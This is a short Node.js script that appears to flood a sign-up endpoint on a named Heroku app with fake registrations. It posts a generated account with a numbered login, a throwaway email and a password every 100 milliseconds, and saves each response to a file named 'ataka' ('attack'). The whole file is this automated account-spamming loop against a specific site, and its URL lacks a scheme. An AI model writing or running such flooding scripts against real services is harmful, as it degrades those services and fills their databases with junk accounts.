const request = require('request')
const fs=require('fs')
///1-
var i=0
setInterval(() => {
    request.post({
    url: 'centerstudy.herokuapp.com', form: {
        firstname: "ataka",
        login: "ataka"+i,
        lastname:"ataka",
        email: i+"kdsdj@mh.com",
        password: i+"yeufh"

    }
}, (error, response, body) => {
    console.log("error:", error)
    fs.writeFile('ataka.html', body, function (err) {
        if (err) throw err;
        console.log('Saved!00');
    });
    //  console.log(body)
    //  console.log("response",response)
    console.log(0, response.statusCode)


})
}, 100);
